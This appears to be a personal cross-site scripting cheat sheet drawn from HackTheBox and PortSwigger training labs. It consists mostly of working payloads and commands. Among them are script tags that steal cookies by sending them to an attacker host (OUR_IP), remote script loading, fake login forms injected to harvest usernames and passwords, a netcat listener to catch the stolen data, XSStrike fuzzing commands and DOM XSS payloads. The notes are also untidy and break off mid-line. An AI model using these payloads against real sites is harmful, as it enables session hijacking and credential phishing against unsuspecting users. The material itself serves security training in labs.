# 🛠️ XSS Cheatsheet

## 📜 Basic Payloads
```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
````

---

## 🎨 Visual Modifications

```html
<script>document.body.style.background = "#141d2b"</script>   <!-- Change background color -->
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>   <!-- Change background image -->
<script>document.title = 'HackTheBox Academy'</script>   <!-- Change website title -->
```

---

## 🧩 DOM Manipulation

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>   <!-- Overwrite website body -->
<script>document.getElementById('urlform').remove();</script>   <!-- Remove an HTML element -->
```

---

## 📡 External Interaction

```html
<script src="http://OUR_IP/script.js"></script>   <!-- Load remote script -->
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>   <!-- Steal cookies -->
```

---

# ⚡ Commands

### 🔎 XSS Scanning

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

### 📡 Listener Setup

```bash
sudo nc -lvnp 80
```

### 🌐 Simple PHP Webserver

```bash
sudo php -S 0.0.0.0:80
```


### **⚡PHISING:**
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```


## 🔹 3. Save Request to a File
the request save to to a file capture it using the burp
Save it as `request.txt`:

`POST /post_comment.php HTTP/1.1 Host: target.com Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=abcd1234  comment=hello&post_id=123`

---

## 🔹 4. Run XSStrike with Request File

Now run XSStrike against that request:

`python3 xsstrike.py -r request.txt`

python3 xsstrike.py -f req.txt --data "comment=PAYLOAD"
Or for another field:

`python3 xsstrike.py -f req.txt --data "name=PAYLOAD"
`python3 xsstrike.py -f req.txt --data "email=PAYLOAD"
`python3 xsstrike.py -f req.txt --data "website=PAYLOAD"

Automated Fuzzing (all params)

If you want XSStrike to fuzz all fields automatically, just do

`python3 xsstrike.py -f req.txt --fuzzer


`python3 xsstrike.py -u "https://0ac3003d045222878032b3c200f60010.web-security-academy.net/post/comment" \
--data `"csrf=cUKlsG8byWDnTy72CGQHMUt73SErSM48&postId=9&comment=XSSTEST&name=iffi-x&email=iffi%40iffi.com&website=http://iffi.com" \
`--headers "Cookie: session=FWzrjgF3hYNrpGYlVsoD1PkdxJC2JbQQ" \
`--fuzzer``

DOM XSS 
location.search vuln in dom 
in document.write: 
if the query is writte in document so break the imag attribute and 
"><svg onload=alert(1)> 
 
 in inner HTML
<svg onload=alert(1)> 

python3 xsstrike.py -u "https://0a07001d0340bcff801c038500bf0038.web-security-academy.net/?search=test" --fuzzer --blind
 if its dom based do this 

the url parameter is setting the return path to / 
/feedback?returnPath=javascript:alert(document.cookie)
enter 
javascript:alert(doucument.cookie)

# DOM XSS in jQuery selector sink using a hashchange event

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

## Reflected XSS into attribute with angle brackets HTML-encoded
<input value="test" " onmouseover="alert(1)">
 reflected XSS in 